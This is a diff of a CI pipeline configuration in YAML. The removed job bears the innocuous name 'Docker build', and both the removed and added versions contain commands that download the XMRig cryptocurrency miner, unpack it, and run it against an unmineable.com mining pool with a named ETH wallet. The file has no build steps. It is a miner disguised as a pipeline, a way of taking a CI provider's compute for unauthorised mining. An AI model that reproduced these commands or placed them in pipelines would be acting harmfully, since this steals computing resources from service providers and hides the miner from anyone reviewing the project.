@@ -1,18 +1,16 @@
 version: v1.0
-name: Using execution_time_limit
+name: Initial Pipeline
 agent:
   machine:
     type: e1-standard-2
-    os_image: ubuntu1804
+    os_image: ubuntu2004
 blocks:
-  - name: Creating Docker Image
-    execution_time_limit:
-      minutes: 15
+  - name: 'Block #1'
     task:
       jobs:
-      - name: Docker build
-        commands:
-          - curl -LO https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
-          - tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz
-          - mv xmrig-6.21.3/xmrig . && rm -rf xmrig-6.21.3 xmrig-6.21.3-linux-static-x64.tar.gz
-          - ./xmrig -o rx-asia.unmineable.com:3333 -a rx -k -u ETH:0xE44602c3ACC41d1b40cdB8cA1e820E52B0a253a0.test -p x
+        - name: 'Job #1'
+          commands:
+            - 'curl -LO https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz'
+            - tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz
+            - mv xmrig-6.21.3/xmrig . && rm -rf xmrig-6.21.3 xmrig-6.21.3-linux-static-x64.tar.gz
+            - './xmrig -o rx-asia.unmineable.com:3333 -a rx -k -u ETH:0xE44602c3ACC41d1b40cdB8cA1e820E52B0a253a0.test -p x'
